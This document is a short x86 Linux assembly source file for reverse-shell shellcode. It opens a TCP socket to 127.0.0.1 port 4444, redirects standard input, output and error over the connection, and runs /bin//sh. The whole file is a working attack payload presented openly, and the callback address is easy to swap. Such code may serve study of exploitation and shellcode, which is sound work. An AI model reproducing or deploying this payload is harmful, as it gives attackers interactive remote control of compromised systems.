
global _start
section .text

_start:
	xor eax,eax
	xor ebx,ebx
	xor ecx,ecx
	xor edx,edx

	mov ax,0x167 ;syscall of socket(binding the connection)
	mov bl,0x2
	mov cl,0x1
	int 0x80
	mov ebx,eax
	
	;creating structure
	push 0x0101017f ;127.0.0.1
	push word 0x5c11	;port 4444
	push word 0x2	;AF_INET ,TCP
	
	;connect call
	
	mov ecx,esp
	mov dl,0x10
	xor eax,eax
	mov ax,0x16a
	int 0x80
	
	;dup2 STDIN
	xor eax,eax
	mov al,0x3f
	xor ecx,ecx
	int 0x80
	
	;dup2 STDOUT
	xor eax,eax
	mov al,0x3f
	mov cl,0x1
	int 0x80

	;dup STDERR
	xor eax,eax
	mov al,0x3f
	mov cl,0x2
	int 0x80

	;reverse shell using bash 

	xor eax,eax
	mov edx,eax
	mov al,11
	push edx
	push 0x68732f2f
	push 0x6e69622f
	mov ebx,esp
	mov ecx,edx
	int 0x80

	
